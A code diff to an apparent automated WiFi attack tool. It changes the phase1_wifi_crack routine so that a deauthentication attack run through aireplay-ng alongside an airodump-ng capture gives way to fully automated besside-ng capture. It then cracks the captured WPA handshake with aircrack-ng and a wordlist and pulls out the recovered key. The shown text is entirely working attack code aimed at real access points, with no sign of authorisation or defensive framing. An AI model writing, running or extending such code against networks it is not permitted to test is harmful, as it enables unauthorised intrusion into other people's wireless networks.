@@ -445,7 +445,7 @@ def auto_route(subnets: list[str]):
 
 def preflight_check():
     """Verify required system tools are installed before running any phase."""
-    tools = ["nmap", "aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]
+    tools = ["nmap", "aircrack-ng", "airodump-ng", "besside-ng", "airmon-ng"]
     missing = []
     for tool in tools:
         rc, _ = run_cmd(f"which {tool}", capture=False)
@@ -590,37 +590,25 @@ def phase1_wifi_crack() -> PhaseResult:
                 f"[bold white]Target    :[/bold white] {chosen['ssid']}  ({bssid})\n"
                 f"[bold white]Channel   :[/bold white] {channel}\n"
                 f"[bold white]Duration  :[/bold white] 60 s\n"
-                f"[bold white]Deauth    :[/bold white] [green]auto — firing in 3 s[/green]",
-                title="[bold cyan] Capturing Handshake [/bold cyan]",
+                f"[bold white]Method    :[/bold white] [green]besside-ng (fully automated)[/green]",
+                title="[bold cyan] Capturing via besside-ng [/bold cyan]",
                 border_style="cyan", expand=False,
             ))
 
-            # Launch deauth in background; 3-second sleep lets airodump-ng
-            # initialise before the first packet is fired.
-            deauth_proc = subprocess.Popen(
-                f"sudo sh -c 'sleep 3 && aireplay-ng --deauth 20 -a {bssid} {iface}'",
-                shell=True,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
+            run_cmd("sudo rm -f ./wpa.cap ./wepe.cap ./besside.log", capture=False)
+            run_cmd(
+                f"sudo timeout 60 besside-ng -b {bssid} {iface}",
+                timeout=75, capture=True,
             )
-            try:
-                run_cmd(
-                    f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} "
-                    f"-w {cap} {iface} 2>/dev/null",
-                    timeout=75, capture=False,
-                )
-            finally:
-                if deauth_proc.poll() is None:
-                    deauth_proc.terminate()
 
-            cap_file = f"{cap}-01.cap"
+            cap_file = "./wpa.cap"
             if not os.path.exists(cap_file):
                 warn("No capture file created — interface may have lost monitor mode")
             else:
                 ok("Capture file found — running aircrack-ng...")
                 wl_arg = wl if wl else "/dev/null"
                 rc, out = run_cmd(
-                    f"sudo aircrack-ng {cap_file} -w {wl_arg}", timeout=300
+                    f"sudo aircrack-ng ./wpa.cap -w {wl_arg}", timeout=300
                 )
                 if "KEY FOUND" in out:
                     # Strip ANSI escape sequences before parsing — aircrack-ng
@@ -667,12 +655,12 @@ def phase1_wifi_crack() -> PhaseResult:
 
             console.print()
             if not Confirm.ask(
-                "[yellow]Retry handshake capture on this AP?[/yellow]", default=True
+                "[yellow]Retry besside-ng capture on this AP?[/yellow]", default=True
             ):
                 break
 
         r.status  = "failed"
-        r.finding = "Handshake not cracked — try a longer capture or bigger wordlist"
+        r.finding = "besside-ng capture not cracked — try a longer capture or bigger wordlist"
         err(r.finding)
 
     finally:
